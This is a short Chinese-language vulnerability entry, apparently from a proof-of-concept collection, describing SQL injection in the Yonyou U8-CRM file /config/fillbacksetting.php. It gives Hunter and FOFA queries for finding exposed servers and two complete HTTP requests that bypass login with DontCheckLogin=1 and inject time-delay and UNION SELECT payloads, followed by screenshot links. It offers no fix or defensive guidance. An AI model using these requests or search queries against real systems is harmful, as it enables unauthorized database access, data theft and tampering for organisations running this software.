# 用友U8-CRM系统fillbacksetting.php存在SQL注入漏洞

用友U8-CRM系统 `/config/fillbacksetting.php` 存在SQL注入漏洞，允许攻击者通过恶意构造的SQL语句操控数据库，从而导致数据泄露、篡改或破坏，严重威胁系统安全。

## hunter

```jade
app.name="用友 CRM"
```

## fofa

```jade
title="用友U8CRM"
```

## poc

```javascript
GET /config/fillbacksetting.php?DontCheckLogin=1&action=delete&id=-99;WAITFOR+DELAY+'0:0:5'-- HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=bgsesstimeout-;
Connection: close
```

```javascript
GET /config/fillbacksettingedit.php?DontCheckLogin=1&action=edit&id=1+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,@@VERSION,NULL,NULL--+ HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=bgsesstimeout-;
Connection: close
```

![image-20240927200752980](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409272007101.png)

![image-20240927200857642](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409272008790.png)
